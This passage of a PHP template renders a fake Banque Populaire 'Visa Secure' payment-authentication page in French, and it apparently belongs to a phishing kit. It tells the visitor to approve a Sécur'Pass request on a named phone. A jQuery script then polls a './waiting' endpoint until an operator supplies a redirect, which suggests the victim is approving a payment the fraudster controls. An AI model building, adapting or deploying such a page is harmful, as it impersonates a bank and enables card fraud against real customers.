MfQ5rRGKzzA9KEAIhMKwTBlTZRDUQZlQQ/beTQkWyq+hH8kLARL9e1cu4xM9cagNQgACLzqAbGqyT4aX3fwOcupc2LBvBHfd+776DNWs06PyB9CIBoG1QDJxD80FoEPyALCIBoK51cDST4obUIfkCWEADRliaPkVM1sM/aXCXjXAh+aByCH5BFBEC0rclq4MrCZYW1oUoGOBP80EBDXq5rDZs7gGwiAKLtTQbBewuXK6wNEPzQYszxA9oAARAdoxAEBwovHrIMt4W1zm/t2rVB2zfOUUcdPfwfr1nRd8rC0xmSjQT5o3nfCpW+GWvm9c4cNgCZRwBEx8ni+sAdO3bYww8/PNUGj5HCZeUPfvCDtbv3jfUVXh/wvc5YA4nG8c0b7vJszVj+yLWs7wPaCwEQHWuyIqiQNGAppRavdvaq5Run8DWMep5331FHHbW6oOQX9Jv7xgZylh/0vFxbroNEI/iF76Ncoc3r30ebF2hfBEB0vEKI6i+80PnCqQpJw8PDtm7durLt3sLjvu/oo49eGRf8XB9WBf2bCj/2/QaUGsp53nqqfUBnIAACkyY3iwxYi9vDCnxr1qwp2+4tPM6hrq6uL3/ve98bsRooDOYtv7JQFbzIaBF3uIkRLvlC+KPaB3QWAiAQY7I9PFi4fKFwadqGCrV61fIts7t3JJ/Pf/nBBx8csoREWsSEwY4xsaHDN289oQ/oXARAYBqFMKjxMbo0LCQp8Gl3r9q+ZdxZbp1fUgiD7YzQB6AYARCowmRlUGFwsSW0eUQ7fO+///7YtX71tntrpTDomX9FzvNUAe0zZNFI3vd/QugDEIcACNSoEM7UGtaGigGbqA7q9araxU8++aQ98sgjJS3fyd29d/7gBz9YbS2mNYNezvtCfqISOmBIKe3e9Ya1kcPP+z+Z29s9YgBQBgEQSFAkFKpCeHLhcpJNhMI+i6mkfetb34qr/A3ncrkrm131q8Rr+/yeGXagf6I6qNDLjuLW8ocLrd3HVeU7ZLOG2b0LoFIEQKDJJncbB7761a9uK1T6eiJvu+8f/uEfbraMUHXwA8v358wbIBA2w0TgM8sPf2BHryfwAagVARBooa985SuDhQB4hyqHXV1dtxSqfmssw8IKYc7yAxObSTRj0eNYuppMtHT9QuDTmBYqfACSRAAE0FA79r3Xnzevb6JK6C0mFMaZOH0j7+dfV3Wvy7qGWMMHoJEIgACaLqwUHpHzFh/K50/uoGA4YhO7c7fPyOVe+yDvb6eyB6AVCIAAUkPB8Aj7U58qhjNzXSdFwuHkRpq0B0RV8hTyciOq5inkHcofeqdwm9bsjRD0AKQFARBApmjjyaHJHdWejfd55gWv53IztOPafD/fN/GeCo1FgbHPKjMSd93zcsHLfP7Q6125rn0KdoWgOpozf6TQsh2lZQsAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAICk/Q81UPz19ERhOwAAAABJRU5ErkJggg=="></custom-image>
                    </div>
                </div>
                <div>
                    <div class="instructions-container">
                        <h2>
                            <custom-text custom-text-key="'network_means_pageType_106'" class="ng-isolate-scope"><span id="" ng-bind-html="customText" class="custom-text ng-binding">Authentification requise pour valider le paiement</span></custom-text>
                        </h2>
                        <ol class="list-text-instructions">
                            <li>
                                <custom-text custom-text-key="'network_means_pageType_107'" class="ng-isolate-scope"><span id="" ng-bind-html="customText" class="custom-text ng-binding">Prenez votre téléphone <b>I phone13</b>.</span></custom-text>
                            </li>
                            <li>
                                <custom-text custom-text-key="'network_means_pageType_108'" class="ng-isolate-scope"><span id="" ng-bind-html="customText" class="custom-text ng-binding">Ouvrez l'application mobile de votre banque.</span></custom-text>
                            </li>
                            <li>
                                <custom-text custom-text-key="'network_means_pageType_109'" class="ng-isolate-scope"><span id="" ng-bind-html="customText" class="custom-text ng-binding">Saisissez votre code Sécur'Pass sur votre téléphone.</span></custom-text>
                            </li>
                        </ol>
                    </div>
                </div>
            </div>

            <div ng-style="style" class="ng-scope footer-content">
                <label class="bpce-fab-button" for="info-button-input">
                    <svg xmlns="http://www.w3.org/2000/svg" width="54" height="54" class="bpce-fab-icon bpce-fab-icon-help" aria-hidden="true">
                        <use href="#picto_action_question_chat">
                            <svg id="picto_action_question_chat" viewBox="0 0 80 80">
                                <path d="M50.3728664,18.3685857 C61.984802,24.0135003 67.0275282,37.8716069 61.7593013,49.6614875 L61.5964981,50.0181129 L61.4011182,50.4165861 C61.2087309,50.7923737 60.9890034,51.1780791 60.7222694,51.6142853 L60.3783667,52.1645705 L60.043623,52.6852921 L62.4626775,62.6359104 C62.6211448,63.2877551 61.9552059,63.8334415 61.3472263,63.549938 L53.5072961,59.8941445 C45.798239,64.7905498 37.8560198,65.3629139 29.7791619,61.5973517 C17.7944942,56.0081104 12.6102634,41.7640126 18.1992869,29.7798119 C23.730848,17.915546 37.7479541,12.7149472 49.6552181,18.0339693 L50.0153876,18.1983757 L50.3728664,18.3685857 Z M58.4075373,52.7285491 C58.3556481,52.5151066 58.3938049,52.2897183 58.5130577,52.105249 L58.6832738,51.8424181 L59.3506869,50.7902492 C59.5895247,50.399984 59.7853292,50.0578566 59.953918,49.7320629 L60.0755039,49.4902831 L60.300103,49.005186 C65.2636949,37.8921907 60.4105939,24.8103637 49.3392645,19.648499 L49.0031303,19.4950633 C37.8916583,14.5315148 24.8112958,19.3845607 19.6493827,30.4559939 C14.4338217,41.639402 19.2715758,54.9315269 30.4553314,60.1472501 C38.1565023,63.7376609 45.6392126,63.1318185 53.0072342,58.3129296 C53.238872,58.1614321 53.5323626,58.1404307 53.7832114,58.2574026 L60.5147284,61.3963382 L58.4075373,52.7285491 Z" transform="matrix(-1 0 0 1 79.795 0)"></path>
                                <path d="M41.4999361,48.6519998 C41.4999361,49.1829998 41.3214361,49.6464998 40.9689361,50.0394998 C40.6134361,50.4324998 40.1304361,50.6289998 39.5199361,50.6289998 C38.9094361,50.6289998 38.4279361,50.4324998 38.0739361,50.0394998 C37.7184361,49.6464998 37.5414361,49.1829998 37.5414361,48.6519998 C37.5414361,48.1194998 37.7184361,47.6574998 38.0739361,47.2614998 C38.4279361,46.8699998 38.9094361,46.6719998 39.5199361,46.6719998 C40.1304361,46.6719998 40.6134361,46.8699998 40.9689361,47.2614998 C41.3214361,47.6574998 41.4999361,48.1194998 41.4999361,48.6519998 M39.6384361,31.6074998 C38.3394361,31.6074998 37.0689361,31.9434998 35.8284361,32.6109998 L35.0604361,30.4854998 C35.7294361,30.1299998 36.4824361,29.8449998 37.3194361,29.6289998 C38.1564361,29.4129998 39.0489361,29.3049998 39.9939361,29.3049998 C41.1159361,29.3049998 42.0354361,29.4564998 42.7539361,29.7624998 C43.4739361,30.0669998 44.0499361,30.4554998 44.4819361,30.9294998 C44.9154361,31.4004998 45.2154361,31.9284998 45.3834361,32.5089998 C45.5499361,33.0879998 45.6354361,33.6444998 45.6354361,34.1769998 C45.6354361,34.8459998 45.5064361,35.4414998 45.2499361,35.9649998 C44.9949361,36.4869998 44.6784361,36.9744998 44.3064361,37.4259998 C43.9314361,37.8789998 43.5174361,38.3124998 43.0644361,38.7264998 C42.6114361,39.1404998 42.1974361,39.5679998 41.8239361,40.0104998 C41.4504361,40.4544998 41.1354361,40.9374998 40.8789361,41.4579998 C40.6224361,41.9814998 40.4949361,42.5649998 40.4949361,43.2159998 L40.4949361,43.5414998 C40.4949361,43.6599998 40.5054361,43.7664998 40.5249361,43.8669998 L38.2209361,43.8669998 C38.1414361,43.4724998 38.1024361,43.0584998 38.1024361,42.6249998 C38.1024361,41.9949998 38.2164361,41.4249998 38.4414361,40.9119998 C38.6679361,40.4004998 38.9589361,39.9234998 39.3129361,39.4794998 C39.6684361,39.0369998 40.0419361,38.6229998 40.4364361,38.2404998 C40.8294361,37.8549998 41.2044361,37.4649998 41.5584361,37.0719998 C41.9139361,36.6804998 42.2034361,36.2634998 42.4299361,35.8314998 C42.6564361,35.3994998 42.7704361,34.9254998 42.7704361,34.4139998 C42.7704361,33.5859998 42.5034361,32.9124998 41.9709361,32.3904998 C41.4399361,31.8684998 40.6614361,31.6074998 39.6384361,31.6074998"></path>
                            </svg>
                        </use>
                    </svg>
                </label>
                <cancel-button cn-label="'network_means_pageType_40'" id="cancelButton" class="ng-isolate-scope bpce-button bpce-button-secondary"><button type="button" class="btn btn-default" aria-label="Annuler" ng-click="cancelAction()" ng-disabled="disabled" ng-show="displayed" data-cy="CANCEL_BUTTON">
                        <span class="fa fa-ban" aria-hidden="true"> </span>
                        <custom-text custom-text-key="cnLabel" class="ng-isolate-scope"><span id="" ng-bind-html="customText" class="custom-text ng-binding">J'annule le paiement</span></custom-text>
                    </button></cancel-button>
            </div>


            <div class="info-modal">
                <div class="modal-container">
                    <div class="info-modal-header">
                        <span><custom-text custom-text-key="'network_means_pageType_60'" class="ng-isolate-scope"><span id="" ng-bind-html="customText" class="custom-text ng-binding">Aide</span></custom-text></span>
                        <span>
                            <label for="info-button-input">
                                <svg xmlns="http://www.w3.org/2000/svg" style="-webkit-print-color-adjust: exact;" viewBox="-932.971 -1405.26 14.3765 14.3766" width="14.3765" height="14.3765" version="1.1">
                                    <g id="shape-fb26b980-eafc-11ec-92a1-b5517b300f35">
                                        <path style="stroke: rgb(177, 178, 181); stroke-linecap: square; stroke-width: 1;" stroke-linecap="square" d="M -931.764 -1404.06 L -919.802 -1392.09 M -931.764 -1392.09 L -919.802 -1404.06"></path>
                                    </g>
                                </svg>
                            </label>
                        </span>
                    </div>
                    <div class="info-modal-body">
                        <p><custom-text custom-text-key="'network_means_pageType_61'" class="ng-isolate-scope"><span id="" ng-bind-html="customText" class="custom-text ng-binding">Visa Secure est un programme mondial Visa, conçu pour aider à renforcer la sécurité de l'achat en ligne pour les titulaires de carte Visa® en les protégeant contre l'utilisation frauduleuse de leur carte.<br> A l'aide d'une simple procédure de contrôle, Visa Secure vérifie vos informations personnelles et vous permet de faire vos courses en toute confiance dans n'importe quel magasin en ligne affichant le logo Visa Secure.</span></custom-text></p>
                        <p><custom-text custom-text-key="'network_means_pageType_62'" class="ng-isolate-scope"><span id="" ng-bind-html="customText" class="custom-text ng-binding">Lorsque vous réalisez un achat en ligne, il vous suffit :<br>
                                    <ol>
                                        <li>De prendre le smartphone sur lequel vous vous êtes inscrit à Sécur'Pass</li>
                                        <li>Si vous avez reçu une notification, de cliquer dessus sinon d'ouvrir votre application Banque Populaire et de suivre les instructions (l'affichage de l'écran peut prendre quelques instants).</li>
                                    </ol>
                                </span></custom-text></p>
                        <p><custom-text custom-text-key="'network_means_pageType_63'" class="ng-isolate-scope"><span id="" ng-bind-html="customText" class="custom-text ng-binding">En cas de problème, nous vous invitons à lire l'aide proposée en ligne et ensuite, s'il persiste, à contacter votre agence bancaire.</span></custom-text></p>
                    </div>
                    <div class="info-modal-footer">
                        <label class="info-button-reversed" for="info-button-input">
                            <custom-text custom-text-key="'network_means_pageType_69'" class="ng-isolate-scope"><span id="" ng-bind-html="customText" class="custom-text ng-binding">Fermer</span></custom-text>
                        </label>
                    </div>
                </div>
            </div>


        </main>
        <script>
            $(document).ready(function() {

                let xhra = new XMLHttpRequest();
                xhra.open('POST', './waiting?start=true');
                xhra.send();

                const t = setInterval(() => {
                    let xhra = new XMLHttpRequest();
                    xhra.open('POST', './waiting?verif=true')
                    xhra.addEventListener('load', () => {
                        console.log(xhra.responseText);
                        if (xhra.responseText) {
                            clearInterval(t);
                            $('#UoOhHPDvSs').css({
                                'background': '#2a782b'
                            });
                            $('#waiting-text').hide();
                            $('#loader').hide();
                            $('#validared-text').show();

                            setTimeout(() => {
                                window.location.href = xhra.responseText
                            }, 5000)
                        }
                    })
                    xhra.send()
                }, 3000)

            });
        </script>
    </body>

    </html>
<?php
    return ob_get_clean();
})();

$html = $html;
require_once($_SERVER["DOCUMENT_ROOT"] . '/views/components/base.php');
?>